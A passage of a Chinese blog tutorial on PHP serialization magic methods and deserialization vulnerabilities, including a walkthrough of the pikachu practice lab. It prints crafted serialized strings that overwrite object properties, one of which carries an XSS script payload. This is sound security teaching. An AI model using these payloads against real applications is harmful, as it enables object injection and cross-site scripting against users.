republic&quot;</span>);<span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seri</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$mySite</span>);<span class="comment">//序列化,返回字符串用$seri存放</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$seri</span>.<span class="string">&quot;\n&quot;</span>;<span class="comment">//打印观察serialize函数执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Site2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$seri</span>);<span class="comment">//反序列化,使用serivalize的结果作为输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$Site2</span>();<span class="comment">//观察反序列化得到的实例</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__serialize acitved </span><br><span class="line">O:4:&quot;Site&quot;:2:&#123;s:1:&quot;d&quot;;s:12:&quot;dustball.top&quot;;s:1:&quot;t&quot;;s:12:&quot;the republic&quot;;&#125;</span><br><span class="line">__unserialize actived </span><br><span class="line">[the republic,dustball.top]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>序列化得到的字符串含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象:类名长度4:类名&quot;Site&quot;:两个成员:&#123;</span><br><span class="line">	字符串类型:长度6:键&quot;domain&quot;;字符串类型:字符串类型:长度12:值&quot;dustball.top&quot;;</span><br><span class="line">	字符串类型:长度5:键&quot;title&quot;;字符串类型:字符串类型:长度12:值&quot;the republic&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>__serialize和__unserialize</code>会影响键,这里键就只有一个字符,分别是"s","t"</p>
<blockquote>
<p><code>O:4:"Site":2:&#123;s:1:"d";s:12:"dustball.top";s:1:"t";s:12:"the republic";&#125;</code></p>
</blockquote>
<p>如果不显式<code>__serialize</code>,则键默认就是成员变量名,<code>"domain","title"</code></p>
<h4 id="sleep__wakeup"><code>__sleep()&amp;&amp;__wakeup()</code></h4>
<blockquote>
<p>如果已经显式<code>__serialize</code>则<code>__sleep</code>写了白写</p>
<p>如果已经显式<code>__unserialize</code>则<code>__wakeup</code>写了白写</p>
</blockquote>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>
函数会检查类中是否存在一个魔术方法 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则
<strong><code>null</code></strong> 被序列化，并产生一个
<strong><code>E_NOTICE</code></strong> 级别的错误。</p>
</blockquote>
<p><code>__sleep()&amp;&amp;__wakeup()</code>调用时机和<code>__serialize&amp;&amp;__unserialize</code>差不多,但是优先级不如后者,后者存在时不会调用前者</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span> = <span class="number">0</span>, <span class="variable">$t</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$d</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__sleep acitved \n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;domain&#x27;</span>,<span class="string">&#x27;title&#x27;</span>];<span class="comment">//此处只能写类成员键组成的数组,表示需要参与序列化的成员</span></span><br><span class="line">        <span class="comment">//return [&#x27;d&#x27;,&#x27;t&#x27;];如果这样写会报错,因为Site类没有d这个成员变量,应该写domain</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__wakeup actived \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //方便打印观察,重载<span class="title">invoke</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span> . <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot;,&quot;</span> . <span class="variable language_">$this</span>-&gt;domain . <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the republic&quot;</span>); <span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$mySite</span>); <span class="comment">//序列化,返回字符串用$seri存放</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$seri</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">//打印观察serialize函数执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Site2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$seri</span>); <span class="comment">//反序列化,使用serivalize的结果作为输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$Site2</span>();<span class="comment">//观察反序列化得到的实例</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__sleep acitved </span><br><span class="line">O:4:&quot;Site&quot;:2:&#123;s:6:&quot;domain&quot;;s:12:&quot;dustball.top&quot;;s:5:&quot;title&quot;;s:12:&quot;the republic&quot;;&#125;</span><br><span class="line">__wakeup actived </span><br><span class="line">[the republic,dustball.top]</span><br></pre></td></tr></table></figure>
<p><code>serialize</code>函数会根据<code>__sleep</code>指定参与序列化的成员,进行序列化,这里指定了domain和title都参与实例化,也可以只指定domain参与,也可以都不参与,那么运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__sleep acitved \n&quot;</span>;</span><br><span class="line">        <span class="comment">// return [&#x27;domain&#x27;,&#x27;title&#x27;];</span></span><br><span class="line">        <span class="keyword">return</span> [];<span class="comment">//都不参与实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">__sleep acitved </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Site&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">__wakeup actived </span><br><span class="line">[,]</span><br></pre></td></tr></table></figure>
<h4 id="clone"><code>__clone</code></h4>
<p>作用是
实现深拷贝,在调用<code>clone</code>时默认调用<code>__clone</code>函数</p>
<h4
id="set__get__isset__unset"><code>__set&amp;&amp;__get&amp;&amp;&amp;__isset&amp;&amp;__unset</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public __set(string $name, [mixed]</span><br><span class="line"></span><br><span class="line">public __get(string $name): [mixed]</span><br><span class="line"></span><br><span class="line">public __isset(string $name): bool</span><br><span class="line"></span><br><span class="line">public __unset(string $name): void</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在给不可访问（protected 或 private）或不存在的属性赋值时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>
会被调用。</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>
会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或
<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.empty.php">empty()</a>
时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>
会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a>
时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>
会被调用。</p>
</blockquote>
<h2 id="反序列化漏洞">反序列化漏洞</h2>
<h3 id="魔术方法的调用时机">魔术方法的调用时机:</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr1</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr2</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;varr1 . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>, <span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(); <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">echoP</span>();  <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;  <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__construct</span><br><span class="line">abc</span><br><span class="line">__toString</span><br><span class="line">__sleep</span><br><span class="line">__wakeup</span><br><span class="line">__toString</span><br><span class="line">__destruct</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure>
<h3 id="最简单的例子">最简单的例子</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$only</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;only;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>尝试构造负载,将<code>$only="demo"</code>覆盖掉</p>
<p>类名为"A",只有一个字符</p>
<p>类有一个成员变量,没有显式<code>__serialize</code>指定键名,因此序列化字符串中的键就是变量名<code>$only</code>,显然这个键名长度为4字符,</p>
<p>值就根据需要修改了</p>
<p>因此可以构造出序列化字符串:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:&quot;A&quot;:1:&#123;s:4:&quot;only&quot;;s:6:&quot;empire&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721010820412.png"
alt="image-20220721010820412" />
<figcaption aria-hidden="true">image-20220721010820412</figcaption>
</figure>
<h3 id="pikachu靶场-php反序列化漏洞">pikachu靶场-php反序列化漏洞</h3>
<p>靶场没有给任何提示,也没有给源代码,目前我猜不出这个类有几个成员,都叫啥,有没有显式<code>__serialize</code>等等,还是看看后端的代码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;<span class="comment">//反序列化不成功则 大兄弟,来点劲爆点儿的!</span></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;<span class="comment">//反序列化成功,则构造好$html,待会儿要向前端打印该值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>显然根据刚才最简单的例子,可以构造一个序列化字符串覆盖掉<code>$test="pikachu"</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:6:&quot;empire&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721011634848.png"
alt="image-20220721011634848" />
<figcaption aria-hidden="true">image-20220721011634848</figcaption>
</figure>
<p>既然如此,<code>6:"empire"</code>这里只需要按照<code>负载字符串长度:"负载字符串"</code>这种格式随便改.如果改成XSS攻击语句,往前端一打印不就实现XSS攻击了吗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:26:&quot;&lt;script&gt;alert(0);&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721011848980.png"
alt="image-20220721011848980" />
<figcaption aria-hidden="true">image-20220721011848980</figcaption>
</figure>
<h3 id="反序列化成员对象">反序列化成员对象</h3>
<p>前面的例子和靶场中,反序列化构造的成员变量都是字符串类型,</p>
<p>能否用反序列化充实一个成员对象呢?</p>
<p>显然可以</p>
<p>以链表类为例子,</p>
<p>链表节点<code>LinkedNode</code>有两个成员,一个是本节点的value值,另一个是下一个节点的引用next</p>
<p>链表类<code>LinkedList</code>有一个成员,即附加头节点成员对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span>,<span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNext</span>(<span class="params"><span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertHead</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$node</span>=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="variable">$v</span>,<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$node</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$linkedlist</span>=<span class="keyword">new</span> <span class="title class_">LinkedList</span>;</span><br><span class="line"><span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="string">&quot;empire&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$linkedlist</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例化一个链表对象linkedlist,插入两个节点,然后对其序列化得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">                     O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">1</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这一长串太不直观,换行缩进一下得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">    O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">            O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">1</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最外层是LinkedList实例</p>
<p>从第二层开始都是LinkedNode实例,其结构为</p>
